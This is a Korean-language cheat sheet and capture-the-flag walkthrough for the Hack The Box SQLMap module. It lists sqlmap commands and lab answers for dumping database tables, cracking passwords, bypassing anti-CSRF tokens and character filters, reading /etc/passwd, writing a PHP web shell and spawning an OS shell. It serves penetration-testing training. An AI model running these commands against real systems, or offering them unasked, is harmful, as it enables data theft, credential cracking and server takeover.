# SQLMAP 필수사항

## SQLMAP 필수사항



| **명령**                                                                                                                    | **설명**                                                                                                                         |
| ------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| `sqlmap -h`                                                                                                               | 기본 도움말 메뉴 보기                                                                                                                   |
| `sqlmap -hh`                                                                                                              | 고급 도움말 메뉴 보기 [SQLMap 시작하기](https://academy.hackthebox.com/module/58/section/694)                                               |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                | `SQLMap`스위치를 사용하여 사용자 입력을 요청하지 않고 실행합니다 `batch`.                                                                               |
| `sqlmap output logging information definitions`                                                                           | [SQLMap 출력 설명](https://academy.hackthebox.com/module/58/section/696)                                                           |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                               | `SQLMap`POST 요청으로                                                                                                              |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                              | 별표로 주입 지점을 지정하는 POST 요청                                                                                                        |
| `sqlmap -r req.txt`                                                                                                       | HTTP 요청 파일 전달 `SQLMap` [HTTP 요청 파일로 SQLMap을 실행하려면 다음과 같이 -r 플래그를 사용합니다.](https://academy.hackthebox.com/module/58/section/517) |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`                                                        | 쿠키 헤더 지정                                                                                                                       |
| `sqlmap -u www.target.com --data='id=1' --method PUT`                                                                     | PUT 요청 지정                                                                                                                      |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`                                             | 출력 파일에 트래픽 저장 [SQLMap 오류 처리](https://academy.hackthebox.com/module/58/section/695)                                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                                            | 자세한 수준 지정                                                                                                                      |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`                                                     | 접두사 또는 접미사 지정 [공격 튜닝](https://academy.hackthebox.com/module/58/section/526)                                                    |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                                                                          | 수준 및 위험 지정                                                                                                                     |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`                                  | 기본 DB 열거                                                                                                                       |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                                             | 테이블 열거                                                                                                                         |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                                      | 테이블/행 열거                                                                                                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`                             | 조건부 열거                                                                                                                         |
| `sqlmap -u "http://www.example.com/?id=1" --schema`                                                                       | 데이터베이스 스키마 열거                                                                                                                  |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                                               | 데이터 검색 중                                                                                                                       |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                                            | 비밀번호 열거 및 크래킹                                                                                                                  |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF 토큰 우회 [Anti-CSRF Token Bypass 스위치](https://academy.hackthebox.com/module/58/section/530)                             |
| `sqlmap --list-tampers`                                                                                                   | 모든 변조 스크립트 나열                                                                                                                  |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                              | DBA 권한 확인                                                                                                                      |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | 로컬 파일 읽기                                                                                                                       |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | 파일 쓰기                                                                                                                          |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | OS 셸 생성                                                                                                                        |

## 연습 사례



> [질문 SQLMAP](https://academy.hackthebox.com/module/58/section/517)

> 테이블의 내용은 무엇입니까 `flag2`? (사례#2) POST 매개변수의 SQLi 취약점 탐지 및 악용`id`

```
sqlmap -r case2.req --batch -p 'id' --flush-session --level=5 --risk=3
```

```
sqlmap -r case2.req --batch -p 'id' --level=5 --risk=3 --dbms MySQL --dbs
```

```
sqlmap -r case2.req --batch -p 'id' --level=5 --risk=3 --dbms MySQL -D testdb -T flag2 --dump
```

> 테이블 flag3의 내용은 무엇입니까? (사례#3)\
> Cookie 값의 SQLi 취약점 탐지 및 공격`id=1`

```
sqlmap -r case3.req --batch -p 'id' --cookie="id=1" --level=5 --risk=3 --flush-session
```

```
sqlmap -r case3.req --batch -p 'id' --cookie="id=1" --level=5 --risk=3 --dbms MySQL --dbs
```

```
sqlmap -r case3.req --batch -p 'id' --cookie="id=1" --level=5 --risk=3 --dbms MySQL -D testdb -T flag3 --dump
```

> 테이블 flag4의 내용은 무엇입니까? (사례 #4) JSON 데이터 {"id": 1}의 SQLi 취약점 탐지 및 악용

[![sqlmap-json](https://github.com/missteek/cpts-quick-references/raw/main/images/sqlmap-json.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/sqlmap-json.png)

```
sqlmap -r case4.req --batch -p 'id' --level=5 --risk=3 --flush-session
```

```
sqlmap -r case4.req --batch -p 'id' --level=5 --risk=3 -dbms MySQL --dbs
```

```
sqlmap -r case4.req --batch -p 'id' --level=5 --risk=3 -dbms MySQL -D testdb -T flag4 --dump
```

> [질문 SQLMAP - 공격 튜닝](https://academy.hackthebox.com/module/58/section/526)

> 테이블 flag5의 내용은 무엇입니까? (사례#5) GET 매개변수 ID의 SQLi 취약점 탐지 및 악용(OR)

```
sqlmap -r case5.req --batch -p 'id' --level=5 --risk=3 -dbms MySQL --dbs --flush-session
```

```
sqlmap -r case5.req --batch -p 'id' --level=5 --risk=3 -dbms MySQL -D testdb -T flag5 --dump 
```

> 테이블 flag6의 내용은 무엇입니까? (사례#6) `col`비표준 경계를 갖는 GET 매개변수의 SQLi 취약점을 탐지하고 악용합니다. 백틱의 원인과 SQL 쿼리 구문 오류가 성공적으로 열거되었는지 테스트합니다.

```
sqlmap -r case6.req --batch -p 'col' --level=5 --risk=3 --prefix='`)' -D testdb -T flag6 --dump --flush-session
```

> 테이블 flag7의 내용은 무엇입니까? (사례 #7) UNION 쿼리 기반 기술을 사용하여 GET 매개변수 ID의 SQLi 취약점을 탐지하고 악용합니다.\
> \--no-cast 옵션이 없으면 sqlmap은 테이블을 검색할 수 없습니다. --no-cast 옵션을 사용하면 sqlmap은 테이블을 검색할 수 있지만 열은 검색할 수 없습니다. --no-cast 옵션을 사용하면 sqlmap은 테이블을 검색할 수 있지만 열은 검색할 수 없습니다.

```
sqlmap -r case7.req --batch -dbms MySQL --union-cols=5 -D testdb -T flag7 --dump --no-cast --flush-session
```

> [질문 - 데이터베이스 열거 - 현재 사용자 db is-dba](https://academy.hackthebox.com/module/58/section/510)

> `flag1`데이터베이스 의 테이블 내용은 무엇입니까 `testdb`? (사례#1) GET 매개변수 ID의 SQLi 취약점 탐지 및 악용

```
sqlmap -r case1.req --batch -p 'id' -dbms MySQL -D testdb -T flag1 --dump
```

> [질문 - 고급 데이터베이스 열거](https://academy.hackthebox.com/module/58/section/529)

> 이름에 "style"이 포함된 열의 이름은 무엇입니까? (사례#1)

```
sqlmap -r case1.req --batch -p 'id' --search -C "style"
```

> Kimberly 사용자의 비밀번호는 무엇입니까? (사례#1)

```
sqlmap -r case1.req --batch -p 'id' -dbms MySQL -D testdb -T users --columns -C name,password --dump --no-cast
```

[![sqlmap-열](https://github.com/missteek/cpts-quick-references/raw/main/images/sqlmap-columns.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/sqlmap-columns.png)

> [질문 - 웹 애플리케이션 보호 우회](https://academy.hackthebox.com/module/58/section/530)

> 테이블 flag8의 내용은 무엇입니까? (사례 #8) 안티 CSRF 보호를 관리하면서 POST 매개변수 ID에서 SQLi 취약점을 탐지하고 악용합니다. (참고: 비표준 토큰 이름이 사용됨)

[![sqlmap csrf 토큰 우회](https://github.com/missteek/cpts-quick-references/raw/main/images/sqlmap-csrf-token-bypass.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/sqlmap-csrf-token-bypass.png)

```
sqlmap -r case8.req --batch -p "id" --csrf-token="t0ken" -dbms MySQL -D testdb -T flag8 --dump --flush-session --no-cast
```

> 테이블 flag9의 내용은 무엇입니까? (사례 #9) 고유한 임의 값을 처리하면서 GET 매개변수 ID에서 SQLi 취약점을 탐지하고 악용합니다 `uid`.

[![sqlmap-고유-매개변수-uid](https://github.com/missteek/cpts-quick-references/raw/main/images/sqlmap-unique-parameter-uid.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/sqlmap-unique-parameter-uid.png)

```
sqlmap -r case9.req --batch -p "id" --randomize="uid" -dbms MySQL -D testdb -T flag9 --dump --flush-session --no-cast
```

> 테이블 flag10의 내용은 무엇입니까? (사례 #10) 원시적 보호 - POST 매개변수 ID에서 SQLi 취약점을 탐지하고 악용합니다.

```
sqlmap -r case10.req --batch -p "id" --random-agent -dbms MySQL -D testdb -T flag10 --dump --flush-session --no-cast
```

> 테이블 flag11의 내용은 무엇입니까? (사례#11) 사례11 - 문자 필터링 `'<', '>'` GET 매개변수의 SQLi 취약점을 탐지 및 악용하고 [Tamper Script를](https://academy.hackthebox.com/module/58/section/530)`id` 사용하여 우회합니다 .

```
sqlmap -r case11.req --batch -p "id" --tamper=between -dbms MySQL -D testdb -T flag11 --dump --flush-session --no-cast
```

> 가장 널리 사용되는 변조 스크립트는 `between`모든 초과 연산자를 `(>)`NOT BETWEEN 0 AND #로 바꾸고 같음 연산자를 `(=)`BETWEEN # AND #로 바꾸는 것입니다. 이런 방식으로 적어도 SQLi 목적에서는 많은 기본 보호 메커니즘(주로 XSS 공격 방지에 중점을 둠)을 쉽게 우회할 수 있습니다.

> [SQLMAP에 대한](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#sqlmap) Burp Suite Certified Professional 연구 노트

> [질문 - OS 악용](https://academy.hackthebox.com/module/58/section/697)

> 파일을 읽으려면 SQLMap을 사용해 보십시오 `/var/www/html/flag.txt`. 호스트 OS를 악용하려면\
> GET 매개변수의 SQLi 취약점을 이용하세요 . `id`먼저 DBA 권한이 있는지 확인하세요.

```
sqlmap -r os-exploit.req --batch -p "id" --is-dba --flush-session
```

> DBA = 사실입니다. OS에서 플래그 파일을 읽습니다.

```
sqlmap -r os-exploit.req --batch -p "id" --dbms MySQL --file-read="/var/www/html/flag.txt"

cat /home/kali/.local/share/sqlmap/output/83.136.248.28/files/_var_www_html_flag.txt
```

> SQLMap을 사용하여 원격 호스트에서 대화형 OS 셸을 얻고 호스트 내에서 다른 플래그를 찾으십시오.

```
sqlmap -r os-exploit.req --batch -p "id" --os-shell
```

### 기술 평가



> [SQLMAP 기술 평가](https://academy.hackthebox.com/module/58/section/534)

[![mimishop-sqlmap](https://github.com/missteek/cpts-quick-references/raw/main/images/mimishop-sqlmap.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/mimishop-sqlmap.png)

> 기본 보호 메커니즘을 갖춘 웹 애플리케이션에 대한 액세스 권한이 부여됩니다. 이 모듈에서 학습한 기술을 사용하여 SQLMap으로 SQLi 취약점을 찾고 그에 따라 활용하세요. 이 모듈을 완료하려면 플래그를 찾아 여기에 제출하세요.

> [Burp Suite는 http://94.237.51.159:49252/action.php](http://94.237.51.159:49252/action.php) 에서 SQL 주입 취약점을 발견했습니다 .

[![sqlmap-기술-평가-감지](https://github.com/missteek/cpts-quick-references/raw/main/images/sqlmap-skills-assessment-detect.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/sqlmap-skills-assessment-detect.png)

```
sqlmap -r mimishop-action.req --batch -p 'id' --random-agent --tamper=between -dbms MySQL --flush-session
```

> SQLMAP 발견 `Parameter: JSON id ((custom) POST) Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind`.\
> 권한 확인은 DBA입니다.

```
sqlmap -r mimishop-action.req --batch -p 'id' --random-agent --tamper=between -dbms MySQL --is-dba
```

> SQLMAP 발견 `current user retrieved: admin@localhost - current user is DBA: False`.\
> 데이터베이스 스키마 열거 확인

```
sqlmap -r mimishop-action.req --batch -p 'id' --random-agent --tamper=between -dbms MySQL --schema
```

> SQLMAP 발견 `retrieved: databases: 'information_schema, production'`. 테이블의 콘텐츠 덤프`final_flag`

```
sqlmap -r mimishop-action.req --batch -p 'id' --random-agent --tamper=between -dbms MySQL -D production -T final_flag --dump
```

> SQLMAP 발견 `HTB{flag}`.
